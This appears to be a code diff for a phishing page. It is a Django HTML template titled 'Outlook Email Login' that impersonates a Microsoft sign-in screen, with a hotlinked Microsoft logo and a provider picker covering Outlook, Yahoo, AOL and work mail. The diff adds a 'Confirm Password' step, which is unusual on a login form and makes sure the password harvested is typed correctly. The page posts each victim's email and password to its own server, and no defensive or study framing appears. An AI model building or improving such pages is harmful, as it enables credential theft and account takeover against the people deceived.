@@ -5,14 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Outlook Email Login</title>
     <style>
-        /* ===== RESET ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        /* ===== BODY ===== */
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
             min-height: 100vh;
@@ -24,69 +18,24 @@
             background: #f0f2f5;
         }
 
-        /* ===== CONTAINER ===== */
-        .container {
-            width: 100%;
-            max-width: 440px;
-            padding: 0;
-            position: relative;
-            z-index: 1;
-        }
+        .container { width: 100%; max-width: 440px; padding: 0; }
 
-        /* ===== CARD ===== */
         .card {
             background: #ffffff;
             border-radius: 16px;
             padding: 44px 36px 32px;
             box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
-            transition: all 0.2s ease;
-            position: relative;
         }
 
-        /* ===== LOGO ===== */
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-        }
+        .logo { text-align: center; margin-bottom: 28px; }
+        .logo img { height: 36px; width: auto; display: inline-block; }
 
-        .logo img {
-            height: 36px;
-            width: auto;
-            display: inline-block;
-        }
+        .header-text { text-align: center; margin-bottom: 28px; }
+        .header-text h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; letter-spacing: -0.3px; }
+        .header-text p { color: #6b6b6b; font-size: 15px; margin-top: 4px; }
 
-        /* ===== HEADER TEXT ===== */
-        .header-text {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-
-        .header-text h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1a1a1a;
-            letter-spacing: -0.3px;
-        }
-
-        .header-text p {
-            color: #6b6b6b;
-            font-size: 15px;
-            margin-top: 4px;
-            font-weight: 400;
-        }
-
-        /* ===== FORM ===== */
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 6px;
-        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 6px; }
 
         .form-group input,
         .form-group select {
@@ -109,9 +58,7 @@
             box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.12);
         }
 
-        .form-group input::placeholder {
-            color: #9ca3af;
-        }
+        .form-group input::placeholder { color: #9ca3af; }
 
         .form-group select {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 8'%3E%3Cpath fill='%23666' d='M6 8L0 0h12z'/%3E%3C/svg%3E");
@@ -121,7 +68,6 @@
             cursor: pointer;
         }
 
-        /* ===== ERROR STATE ===== */
         .form-group input.error {
             border-color: #dc3545;
             box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.12);
@@ -134,12 +80,8 @@
             display: none;
             font-weight: 500;
         }
+        .error-message.show { display: block; }
 
-        .error-message.show {
-            display: block;
-        }
-
-        /* ===== BUTTON ===== */
         .btn {
             width: 100%;
             padding: 14px;
@@ -154,16 +96,8 @@
             position: relative;
             margin-top: 6px;
         }
-
-        .btn:hover {
-            background: #004d8c;
-        }
-
-        .btn:disabled {
-            background: #6c757d;
-            cursor: not-allowed;
-            opacity: 0.7;
-        }
+        .btn:hover { background: #004d8c; }
+        .btn:disabled { background: #6c757d; cursor: not-allowed; opacity: 0.7; }
 
         .btn .spinner {
             display: none;
@@ -175,37 +109,18 @@
             animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
-
-        .btn.loading .spinner {
-            display: block;
-        }
-        .btn.loading .btn-text {
-            display: none;
-        }
+        .btn.loading .spinner { display: block; }
+        .btn.loading .btn-text { display: none; }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* ===== LINKS ===== */
-        .links {
-            text-align: center;
-            margin-top: 20px;
-        }
+        .links { text-align: center; margin-top: 20px; }
+        .links a { color: #0067b8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .links a:hover { text-decoration: underline; }
 
-        .links a {
-            color: #0067b8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 28px;
             padding-top: 18px;
@@ -214,93 +129,53 @@
             font-size: 12px;
             color: #9ca3af;
         }
+        .footer a { color: #0067b8; text-decoration: none; margin: 0 8px; }
+        .footer a:hover { text-decoration: underline; }
+        .footer span { color: #d1d5db; }
 
-        .footer a {
-            color: #0067b8;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .footer span {
-            color: #d1d5db;
-        }
-
-        /* ===== MESSAGES ===== */
         .message {
             padding: 12px 16px;
             border-radius: 8px;
             margin-bottom: 16px;
             font-size: 14px;
         }
-        .message.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .message.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .message.info {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }
+        .message.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .message.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .message.info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
 
-        /* ===== RESPONSIVE ===== */
+        /* Password strength indicator */
+        .password-hint {
+            font-size: 12px;
+            color: #6b6b6b;
+            margin-top: 6px;
+            display: none;
+        }
+        .password-hint.show { display: block; }
+        .password-hint.weak { color: #dc3545; }
+        .password-hint.medium { color: #f0ad4e; }
+        .password-hint.strong { color: #28a745; }
+
+        /* Verify again modal */
+        .verify-box {
+            display: none;
+            background: #f8f9fa;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #333;
+        }
+        .verify-box.show { display: block; }
+        .verify-box strong { color: #0067b8; }
+
         @media (max-width: 480px) {
-            .card {
-                padding: 28px 20px 24px;
-                border-radius: 12px;
-            }
-            .header-text h1 {
-                font-size: 20px;
-            }
-            .header-text p {
-                font-size: 14px;
-            }
-            .form-group input,
-            .form-group select {
-                font-size: 15px;
-                padding: 11px 12px;
-            }
-            .btn {
-                font-size: 15px;
-                padding: 13px;
-            }
-            .logo img {
-                height: 30px;
-            }
-        }
-
-        @media (max-width: 360px) {
-            .card {
-                padding: 20px 14px 18px;
-            }
-            .header-text h1 {
-                font-size: 18px;
-            }
-            .form-group input,
-            .form-group select {
-                font-size: 14px;
-                padding: 10px 10px;
-            }
-            .btn {
-                font-size: 14px;
-                padding: 11px;
-            }
-        }
-
-        @supports (padding: max(0px)) {
-            .container {
-                padding-left: max(20px, env(safe-area-inset-left));
-                padding-right: max(20px, env(safe-area-inset-right));
-            }
+            .card { padding: 28px 20px 24px; border-radius: 12px; }
+            .header-text h1 { font-size: 20px; }
+            .header-text p { font-size: 14px; }
+            .form-group input, .form-group select { font-size: 15px; padding: 11px 12px; }
+            .btn { font-size: 15px; padding: 13px; }
+            .logo img { height: 30px; }
         }
     </style>
 </head>
@@ -309,16 +184,21 @@
     <div class="container">
         <div class="card">
 
-            
+            <div class="logo">
+                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
+            </div>
 
-            <!-- ===== MESSAGES ===== -->
+            <div class="header-text">
+                <h1>Sign in</h1>
+                <p>to continue to your account</p>
+            </div>
+
             {% if messages %}
                 {% for message in messages %}
                 <div class="message {{ message.tags }}">{{ message }}</div>
                 {% endfor %}
             {% endif %}
 
-            <!-- ===== FORM ===== -->
             <form method="POST" id="loginForm" novalidate>
                 {% csrf_token %}
 
@@ -348,21 +228,31 @@
                 <div class="form-group">
                     <label for="password">Password</label>
                     <input type="password" name="password" id="password" placeholder="Enter your password" required>
+                    <div class="password-hint" id="passwordHint"></div>
                 </div>
 
-                <!-- Submit -->
+                <!-- Verify password -->
+                <div class="form-group">
+                    <label for="password_confirm">Confirm Password</label>
+                    <input type="password" name="password_confirm" id="password_confirm" placeholder="Enter your password again" required>
+                    <div class="error-message" id="confirmError">Passwords do not match. Please try again.</div>
+                </div>
+
+                <!-- Verify box that appears on mismatch -->
+                <div class="verify-box" id="verifyBox">
+                    ⚠️ <strong>Passwords don't match.</strong> Please re-enter carefully.
+                </div>
+
                 <button type="submit" class="btn" id="signInBtn">
                     <span class="btn-text">Sign in</span>
                     <span class="spinner"></span>
                 </button>
             </form>
 
-            <!-- ===== CREATE ACCOUNT ===== -->
             <div class="links">
                 <a href="#">Create new account</a>
             </div>
 
-            <!-- ===== FOOTER ===== -->
             <div class="footer">
                 <a href="/privacy/">Privacy Policy</a>
                 <span>|</span>
@@ -375,58 +265,29 @@
     </div>
 
     <script>
-        // ========== DYNAMIC TEXT ==========
+        // ========== SERVICE MAP ==========
         const serviceMap = {
-            'outlook': {
-                label: 'Outlook Email',
-                placeholder: 'Enter your Outlook email',
-                domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'],
-                display: 'Outlook, Hotmail, or Live'
-            },
-            'hotmail': {
-                label: 'Hotmail Email',
-                placeholder: 'Enter your Hotmail email',
-                domains: ['hotmail.com', 'outlook.com', 'live.com', 'msn.com'],
-                display: 'Hotmail, Outlook, or Live'
-            },
-            'yahoo': {
-                label: 'Yahoo Email',
-                placeholder: 'Enter your Yahoo email',
-                domains: ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com'],
-                display: 'Yahoo'
-            },
-            'aol': {
-                label: 'AOL Email',
-                placeholder: 'Enter your AOL email',
-                domains: ['aol.com', 'aim.com'],
-                display: 'AOL'
-            },
-            'office': {
-                label: 'Work Email',
-                placeholder: 'Enter your work email',
-                domains: [],
-                display: 'Work/Business'
-            },
-            'webmail': {
-                label: 'Webmail Email',
-                placeholder: 'Enter your webmail address',
-                domains: [],
-                display: 'Webmail'
-            },
-            'other': {
-                label: 'Email Address',
-                placeholder: 'Enter your email address',
-                domains: [],
-                display: 'Other'
-            }
+            'outlook': { label: 'Outlook Email', placeholder: 'Enter your Outlook email', domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'], display: 'Outlook, Hotmail, or Live' },
+            'hotmail': { label: 'Hotmail Email', placeholder: 'Enter your Hotmail email', domains: ['hotmail.com', 'outlook.com', 'live.com', 'msn.com'], display: 'Hotmail, Outlook, or Live' },
+            'yahoo': { label: 'Yahoo Email', placeholder: 'Enter your Yahoo email', domains: ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com'], display: 'Yahoo' },
+            'aol': { label: 'AOL Email', placeholder: 'Enter your AOL email', domains: ['aol.com', 'aim.com'], display: 'AOL' },
+            'office': { label: 'Work Email', placeholder: 'Enter your work email', domains: [], display: 'Work/Business' },
+            'webmail': { label: 'Webmail Email', placeholder: 'Enter your webmail address', domains: [], display: 'Webmail' },
+            'other': { label: 'Email Address', placeholder: 'Enter your email address', domains: [], display: 'Other' }
         };
 
         const serviceSelect = document.getElementById('service');
         const emailLabel = document.getElementById('emailLabel');
         const emailInput = document.getElementById('emailInput');
         const emailError = document.getElementById('emailError');
+        const passwordInput = document.getElementById('password');
+        const confirmInput = document.getElementById('password_confirm');
+        const confirmError = document.getElementById('confirmError');
+        const passwordHint = document.getElementById('passwordHint');
+        const verifyBox = document.getElementById('verifyBox');
         const loginForm = document.getElementById('loginForm');
 
+        // ===== SERVICE CHANGE =====
         serviceSelect.addEventListener('change', function() {
             const selected = this.value;
             if (selected && serviceMap[selected]) {
@@ -434,23 +295,66 @@
                 emailInput.placeholder = serviceMap[selected].placeholder;
                 emailInput.classList.remove('error');
                 emailError.classList.remove('show');
-                emailError.textContent = '';
             } else {
                 emailLabel.textContent = 'Email';
                 emailInput.placeholder = 'Enter your email';
             }
         });
 
+        // ===== CLEAR ERRORS ON INPUT =====
         emailInput.addEventListener('input', function() {
             this.classList.remove('error');
             emailError.classList.remove('show');
-            emailError.textContent = '';
         });
 
+        confirmInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            confirmError.classList.remove('show');
+            verifyBox.classList.remove('show');
+        });
+
+        // ===== PASSWORD STRENGTH HINT =====
+        passwordInput.addEventListener('input', function() {
+            const val = this.value;
+            passwordHint.classList.remove('weak', 'medium', 'strong');
+
+            if (val.length === 0) {
+                passwordHint.classList.remove('show');
+                return;
+            }
+
+            let strength = 'weak';
+            let text = 'Weak password';
+
+            if (val.length >= 10 && /[A-Z]/.test(val) && /[0-9]/.test(val)) {
+                strength = 'strong';
+                text = 'Strong password ✓';
+            } else if (val.length >= 8) {
+                strength = 'medium';
+                text = 'Medium password';
+            }
+
+            passwordHint.textContent = text;
+            passwordHint.classList.add('show', strength);
+        });
+
+        // ===== VALIDATE EMAIL =====
+        function isValidEmail(email, serviceData) {
+            if (!email || !email.includes('@') || !email.includes('.')) return false;
+            if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
+                return serviceData.domains.some(d => email.toLowerCase().endsWith('@' + d));
+            }
+            return true;
+        }
+
+        // ===== FORM SUBMIT =====
         loginForm.addEventListener('submit', function(e) {
             const selectedService = serviceSelect.value;
             const email = emailInput.value.trim();
-            
+            const password = passwordInput.value;
+            const confirm = confirmInput.value;
+
+            // 1. Check provider selected
             if (!selectedService) {
                 e.preventDefault();
                 alert('Please select your email provider.');
@@ -458,64 +362,61 @@
                 return false;
             }
 
+            // 2. Validate email for provider
             const serviceData = serviceMap[selectedService];
-            
-            if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
-                const isValid = serviceData.domains.some(domain => 
-                    email.toLowerCase().endsWith('@' + domain)
-                );
-                
-                if (!isValid) {
-                    e.preventDefault();
-                    emailInput.classList.add('error');
-                    emailError.textContent = `❌ Please enter a valid ${serviceData.display} email. Must end with: @${serviceData.domains.join(', @')}`;
-                    emailError.classList.add('show');
-                    emailInput.focus();
-                    return false;
-                }
+            if (!isValidEmail(email, serviceData)) {
+                e.preventDefault();
+                emailInput.classList.add('error');
+                emailError.textContent = `❌ Please enter a valid ${serviceData.display} email. Must end with: @${serviceData.domains.join(', @')}`;
+                emailError.classList.add('show');
+                emailInput.focus();
+                return false;
             }
 
-            if (serviceData && (!serviceData.domains || serviceData.domains.length === 0)) {
-                if (!email.includes('@') || !email.includes('.')) {
-                    e.preventDefault();
-                    emailInput.classList.add('error');
-                    emailError.textContent = '❌ Please enter a valid email address (e.g., name@domain.com).';
-                    emailError.classList.add('show');
-                    emailInput.focus();
-                    return false;
-                }
+            // 3. Check password length
+            if (password.length < 6) {
+                e.preventDefault();
+                passwordInput.classList.add('error');
+                alert('Password must be at least 6 characters. Please try again.');
+                passwordInput.focus();
+                return false;
             }
 
+            // 4. Check passwords match
+            if (password !== confirm) {
+                e.preventDefault();
+                confirmInput.classList.add('error');
+                confirmError.classList.add('show');
+                verifyBox.classList.add('show');
+                confirmInput.value = '';
+                confirmInput.focus();
+                return false;
+            }
+
+            // All checks passed
             emailInput.classList.remove('error');
-            emailError.classList.remove('show');
-            
+            confirmInput.classList.remove('error');
+            confirmError.classList.remove('show');
+            verifyBox.classList.remove('show');
+
             const btn = document.getElementById('signInBtn');
             btn.disabled = true;
             btn.classList.add('loading');
-            
+
             return true;
         });
 
+        // ===== EMAIL BLUR VALIDATION =====
         emailInput.addEventListener('blur', function() {
             const selectedService = serviceSelect.value;
             const email = this.value.trim();
-            
             if (!selectedService || !email) return;
-            
+
             const serviceData = serviceMap[selectedService];
-            if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
-                const isValid = serviceData.domains.some(domain => 
-                    email.toLowerCase().endsWith('@' + domain)
-                );
-                
-                if (!isValid) {
-                    this.classList.add('error');
-                    emailError.textContent = `❌ Must end with: @${serviceData.domains.join(', @')}`;
-                    emailError.classList.add('show');
-                } else {
-                    this.classList.remove('error');
-                    emailError.classList.remove('show');
-                }
+            if (!isValidEmail(email, serviceData)) {
+                this.classList.add('error');
+                emailError.textContent = `❌ Must end with: @${serviceData.domains.join(', @')}`;
+                emailError.classList.add('show');
             }
         });
     </script>
